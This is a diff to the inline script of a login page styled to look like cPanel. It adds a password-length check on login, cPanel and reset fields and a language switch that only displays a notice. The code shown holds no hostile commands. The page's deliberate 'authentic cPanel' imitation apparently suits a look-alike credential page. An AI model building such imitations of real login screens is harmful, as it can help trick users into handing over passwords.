-            // Enhanced status message system (cPanel style) - replaces popup
-            function showErrorPopup(message) {
-                show_status(message, 'error');
-            }
+            // Password validation for all password fields
+            const passwordInputs = document.querySelectorAll('input[type="password"]');
+            passwordInputs.forEach(input => {
+                input.addEventListener('input', function() {
+                    const formType = this.id.includes('login') ? 'login' : this.id.includes('cpanel') ? 'cpanel' : 'reset';
+                    const password = this.value.trim();
+                    
+                    if (password.length > 0 && password.length < 6) {
+                        showNotice(formType, `6 characters minimum (${password.length}/6)`, 'error');
+                    } else if (password.length >= 6) {
+                        clearNotices(formType);
+                    }
+                });
+            });
 
-            // Make closeErrorPopup globally accessible (compatibility)
-            window.closeErrorPopup = function() {
-                // No longer needed with status system, but kept for compatibility
-                const statusContainer = DOM.get('login-status');
-                if (statusContainer) {
-                    fade_out(statusContainer);
-                }
-            }
-
-            // Toggle locales function
-            window.toggle_locales = function(showMore) {
-                const mainLocales = document.getElementById('locales_list');
-                const extendedLocales = document.getElementById('extended_locales_list');
-
-                if (showMore) {
-                    mainLocales.style.display = 'none';
-                    extendedLocales.style.display = 'flex';
-                } else {
-                    mainLocales.style.display = 'flex';
-                    extendedLocales.style.display = 'none';
-                }
-            }
+            // Language links handler
+            const languageLinks = document.querySelectorAll('#locales_list a');
+            languageLinks.forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    // Remove active class from all links
+                    languageLinks.forEach(l => l.classList.remove('active'));
+                    // Add active class to clicked link
+                    this.classList.add('active');
+                    const language = this.textContent;
+                    showNotice('login', `Language changed to ${language}`, 'success');
+                });
+            });
         });
-
-        // Add CSS class for focused state
-        const style = document.createElement('style');
-        style.textContent = `
-            .input-field-login.focused {
-                transform: translateY(-1px);
-            }
-
-            .input-field-login.focused input {
-                border-color: #667eea;
-                box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-            }
-
-            /* Authentic cPanel status message styling */
-            #login-status {
-                margin: 15px 0;
-                transition: all 0.3s ease;
-                visibility: hidden;
-                opacity: 0;
-                display: block;
-                font-family: inherit;
-                font-weight: normal;
-                line-height: 1.4;
-            }
-
-            #login-status-message {
-                margin: 0;
-                padding: 0;
-            }
-
-            /* Additional cPanel-like status styling */
-            #login-status.showing {
-                visibility: visible;
-                opacity: 1;
-            }
-        `;
-        document.head.appendChild(style);
     </script>
 </body>
 </html>
